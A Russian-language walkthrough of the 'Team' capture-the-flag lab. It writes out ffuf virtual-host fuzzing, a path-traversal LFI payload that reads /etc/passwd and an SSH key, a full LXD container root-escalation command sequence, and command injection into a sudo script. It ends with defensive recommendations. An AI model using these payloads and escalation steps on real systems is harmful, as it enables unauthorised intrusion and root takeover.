# Отчет по прохождению Team

## 1. Разведка (Reconnaissance)
Сканирование Nmap выявило открытые порты: 21/tcp (FTP — anonymous нет), 22/tcp (SSH), 80/tcp (Apache). На главной странице порта 80 обнаружена стандартная заглушка Apache с текстом: "It works! If you see this add 'team.thm' to your hosts!"

## 2. Добавление виртуального хоста
После добавления team.thm в /etc/hosts открывается страница блога. При первичном осмотре ничего интересного не обнаружено.

## 3. Фаззинг директорий
Проведен фаззинг директорий. Найдены стандартные файлы и директории: .htaccess, .htpasswd (403), /images (200), /scripts (403), /assets (403). Ничего полезного.

## 4. Перебор виртуальных хостов
Запущен перебор виртуальных хостов через ffuf:
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.team.thm" -u http://team.thm -c -t 50
Найдены поддомены: www.dev, dev. Оба доступны.

## 5. Обнаружение LFI-уязвимости
На поддомене dev.team.thm найден параметр page в скрипте script.php:
http://dev.team.thm/script.php?page=teamshare.php
Проверка на LFI:
http://dev.team.thm/script.php?page=/../../../../../../../etc/passwd
Успешно получен файл /etc/passwd. Извлечены имена пользователей: dale, gyles, ftpuser, ubuntu.

## 6. Фаззинг параметра page
Проведен фаззинг параметра page для поиска файлов логов и конфигураций. Найдены ценные файлы:
/etc/ssh/sshd_config — содержит приватный SSH-ключ пользователя dale
/etc/crontab, /var/log/wtmp, /var/log/dmesg, /proc/meminfo и другие.

## 7. Получение SSH-ключа
Из /etc/ssh/sshd_config извлечен приватный ключ пользователя dale в формате OpenSSH. Ключ отформатирован и использован для подключения по SSH.

## 8. Подключение по SSH
Успешное подключение под пользователем dale:
dale@ip-10-48-159-48:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)

## 9. Обнаружение привилегированной группы lxd
Пользователь dale состоит в группе lxd, что позволяет использовать технику эскалации через LXC/LXD контейнер.

## 10. Эскалация через LXD (первый способ)
На атакующей машине собран образ Alpine Linux:
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
Образ передан на целевую машину. На целевой машине выполнены действия по инициализации LXD и импорту образа:
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
При возникновении ошибки "No root device could be found" выполнена повторная инициализация LXD, после чего контейнер успешно создан. Корневая файловая система хоста смонтирована в /mnt. В /mnt/root найден флаг.

## 11. Альтернативный вектор эскалации (sudo)
Проверка прав sudo:
sudo -l
User dale may run the following commands:
(gyles) NOPASSWD: /home/gyles/admin_checks

## 12. Анализ скрипта admin_checks
Скрипт запрашивает имя и команду для выполнения (error). Переменная error подставляется в команду и выполняется.
Уязвимость: ввод произвольной команды в поле error.
Выполнение:
sudo -u gyles /home/gyles/admin_checks
Enter 'date' to timestamp the file: /bin/bash
Получен шелл пользователя gyles:
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)

## 13. Получение флага
Флаг найден в /mnt/root после эскалации через LXD.

## 14. Достижения и новые навыки
Впервые применена эскалация через группу lxd с использованием контейнера. Отработана техника получения SSH-ключа через LFI из /etc/ssh/sshd_config. Использован альтернативный вектор повышения привилегий через sudo с подстановкой команды в скрипт.

## 15. Рекомендации
Ограничить доступ к LXD для непривилегированных пользователей. Удалить приватные ключи из конфигурационных файлов. Проверить скрипт admin_checks на возможность выполнения произвольных команд. Ограничить sudo права для пользователя dale.